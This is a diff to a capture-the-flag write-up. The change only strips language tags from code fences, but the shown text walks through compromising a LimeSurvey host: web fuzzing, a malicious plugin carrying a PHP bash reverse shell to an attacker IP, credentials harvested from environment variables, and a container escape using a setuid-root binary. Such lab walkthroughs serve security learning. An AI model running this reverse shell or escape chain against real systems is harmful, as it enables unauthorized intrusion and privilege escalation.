@@ -39,7 +39,7 @@ We can see that there are just two ports open. The machine's operating system is
 
 When we access the web server, we get an `Forbidden` error. There is probably nothing in the web root and directory indexing is disabled. Let's try fuzzing the webserver.
 
-```bash
+```
 ➜  forgotten ffuf -u http://10.10.111.73/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 
         /'___\  /'___\           /'___\
@@ -99,7 +99,7 @@ By trying to proceed with the installation, we indeed receive a connection to ou
 
 To allow remote hosts to connect to the database, we forgot one thing. We have to explicitly allow the root user to log in from a specific IP address or range. We can achieve so with the following command with MariaDB CLI.
 
-```sql
+```
 MariaDB [(none)]> GRANT ALL PRIVILEGES ON *.* TO 'root'@'10.10.111.73' IDENTIFIED BY 'root' WITH GRANT OPTION;
 
 Query OK, 0 rows affected (0.001 sec)
@@ -107,7 +107,7 @@ Query OK, 0 rows affected (0.001 sec)
 
 After the remote host is allowed, we can see that the the database connecting was created successfully and the database has been populated.
 
-```sql
+```
 MariaDB [test]> show tables;
 +----------------------------------+
 | Tables_in_test                   |
@@ -142,7 +142,7 @@ In oder to do so we have to create a valid plugin. A `LimeSurvey` plugin require
 
 The config file I used looked like this:
 
-```xml
+```
 <?xml version="1.0" encoding="UTF-8"?>
 <config>
     <metadata>
@@ -166,7 +166,7 @@ The config file I used looked like this:
 
 As a reverse shell we can use a simple `bash` reverse shell and PHP's `system()` function:
 
-```php
+```
 <?php
 system("/bin/bash -c 'bash -i >& /dev/tcp/10.8.0.109/443 0>&1'");
 ?>
@@ -194,13 +194,13 @@ We probably have to find a way to escape this docker. Let's try with enumerating
 
 Right away we can see that the `limesvc` user is in the `sudo` group.
 
-```bash
+```
 uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc),27(sudo)
 ```
 
 Let's check it. First we have to obtain a TTY to be able to use the `sudo` command. There is no Python installed so we can use the `script` command to do that.
 
-```bash
+```
 limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/Shell$ script -q /dev/null bash
 $ sudo -l
 sudo -l
@@ -219,7 +219,7 @@ Unfortunately, the `sudo` command requires a user password. Let's look around an
 
 After searching the filesystem for a while I decided to look at the environment variables and bingo! There were indeed some credentials.
 
-```bash
+```
 limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/Shell$ env
 HOSTNAME=efaa6f5097ed
 PHP_VERSION=8.0.30
@@ -236,7 +236,7 @@ _=/usr/bin/env
 
 After supplying the password to the `sudo` command we can see that we can run any command as root inside the container.
 
-```bash
+```
 Matching Defaults entries for limesvc on efaa6f5097ed:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -255,7 +255,7 @@ This indeed worked and we can read the user flag.
 
 Let's take a look at the file system.
 
-```bash
+```
 limesvc@ip-10-10-200-233:/opt/limesurvey$ ls -lah
 total 168K
 drwxr-xr-x  15 limesvc limesvc 4.0K Nov 27 09:49 .
@@ -290,7 +290,7 @@ In the `/opt` directory there seems to be the root of the `LimeSurvey` web appli
 
 Let's try to put a file in here and observe if it really appears in the docker folder as well.
 
-```bash
+```
 limesvc@efaa6f5097ed:/var/www/html/survey$ ls -lah | grep test.txt
 ls -lah | grep test.txt
 -rw-rw-r--   1 limesvc  limesvc     0 Dec 18 12:36 test.txt
@@ -306,7 +306,7 @@ What we can do is to write a small C binary that will attempt to write a public 
 
 Here's the code:
 
-```c
+```
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/stat.h>
@@ -356,13 +356,13 @@ int main()
 
 We can compile this with GCC and upload it to the `/opt/limesurvey` on the host machine.
 
-```bash
+```
 gcc write_key.c -o write_key
 ```
 
 As a next step, we have to use our root access in docker to modify the binary's privileges.
 
-```bash
+```
 chown root:root write_key
 chmod u+s write_key
 chmod +x write_key
